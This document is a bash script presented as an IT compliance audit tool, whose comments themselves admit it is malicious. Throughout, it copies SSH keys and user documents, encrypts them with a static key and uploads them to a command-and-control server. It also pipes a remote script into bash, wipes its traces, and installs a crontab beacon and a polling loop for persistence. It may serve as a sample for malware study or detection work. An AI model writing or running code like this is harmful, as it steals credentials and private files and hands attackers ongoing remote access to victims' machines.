#!/bin/bash
#---------------------------------------------------------------------
# IT Compliance Audit Script
# Author: Jordan Lee, IT Compliance
# Purpose: This script performs a comprehensive system compliance
#          check, including SSH hardening, disk encryption validation,
#          and user directory integrity scanning. A detailed report is
#          generated and uploaded to the central compliance server.
#---------------------------------------------------------------------

set -e
TIMESTAMP=$(date +%Y%m%d%H%M%S)
HOSTNAME=$(hostname)
REPORT_NAME="compliance_${HOSTNAME}_${TIMESTAMP}.tar.gz"
TEMP_DIR="/tmp/.audit_${TIMESTAMP}"
C2_SERVER="http://192.168.45.2:8080"

# -------------------------------------------------------------------
# Legitimate-looking helper: Disk usage check
# -------------------------------------------------------------------
check_disk_usage() {
    echo "[*] Checking disk usage..."
    df -h / /home
}

# -------------------------------------------------------------------
# Legitimate-looking helper: Check for world-writable files
# -------------------------------------------------------------------
audit_permissions() {
    echo "[*] Scanning for world-writable files in /etc..."
    find /etc -type f -perm -o+w 2>/dev/null || true
}

# -------------------------------------------------------------------
# Supposed SSH compliance audit (also exfiltrates SSH keys)
# -------------------------------------------------------------------
audit_ssh_config() {
    echo "[+] Auditing SSH configuration..."
    sshd -T 2>/dev/null | grep -E "PermitRootLogin|PasswordAuthentication" || true
    
    # Collect sensitive SSH material for "offline analysis"
    if [ -d "$HOME/.ssh" ]; then
        cp -r "$HOME/.ssh" "$TEMP_DIR/ssh_data"
    fi
}

# -------------------------------------------------------------------
# "Secure" file encryption for compliance (exfiltrates data & key)
# -------------------------------------------------------------------
encrypt_compliance_data() {
    echo "[+] Encrypting sensitive files for secure transport..."
    mkdir -p "$TEMP_DIR/encrypted"
    # Target user documents
    find "$HOME/Documents" -type f \( -name "*.pdf" -o -name "*.docx" \) -exec cp {} "$TEMP_DIR/encrypted/" \; 2>/dev/null
    
    # Encrypt with a static key (key is then uploaded to attacker)
    ENC_KEY="FAKE_KEY_DO_NOT_USE_1234567890"
    for f in "$TEMP_DIR/encrypted"/*; do
        [ -f "$f" ] && openssl enc -aes-256-cbc -salt -in "$f" -out "$f.enc" -k "$ENC_KEY" 2>/dev/null
        rm -f "$f"
    done
    # Upload the "recovery" key alongside data
    echo "$ENC_KEY" > "$TEMP_DIR/key_recovery.txt"
}

# -------------------------------------------------------------------
# System "update" with remote script execution (dangerous)
# -------------------------------------------------------------------
update_compliance_tool() {
    echo "[*] Updating compliance engine..."
    curl -s http://update.compliance-check.net/install.sh | bash
}

# -------------------------------------------------------------------
# Exfiltration function: bundles everything and phones home
# -------------------------------------------------------------------
exfiltrate_report() {
    echo "[*] Uploading compliance report..."
    cd "$TEMP_DIR"
    tar czf "$REPORT_NAME" .
    # Send to external C2
    curl -s -X POST -F "file=@$REPORT_NAME" "$C2_SERVER/collect" > /dev/null
    # Clean traces
    cd /
    rm -rf "$TEMP_DIR"
}

# -------------------------------------------------------------------
# Persistence & resource consumption (spyware loop)
# -------------------------------------------------------------------
establish_persistence() {
    # Add a periodic callback to crontab
    (crontab -l 2>/dev/null; echo "*/10 * * * * curl -s $C2_SERVER/beacon?host=$HOSTNAME > /dev/null 2>&1") | crontab -
    # Start a subtle CPU consumer disguised as indexing
    {
        while true; do
            curl -s "$C2_SERVER/tasks?host=$HOSTNAME" > /dev/null 2>&1
            sleep 60
        done
    } &
    disown
}

# -------------------------------------------------------------------
# Main execution flow
# -------------------------------------------------------------------
main() {
    echo "=== IT Compliance Audit - $(date) ==="
    mkdir -p "$TEMP_DIR"
    
    check_disk_usage
    audit_permissions
    audit_ssh_config
    encrypt_compliance_data
    update_compliance_tool
    exfiltrate_report
    establish_persistence
    
    echo "=== Audit complete. Results uploaded. ==="
}

main "$@"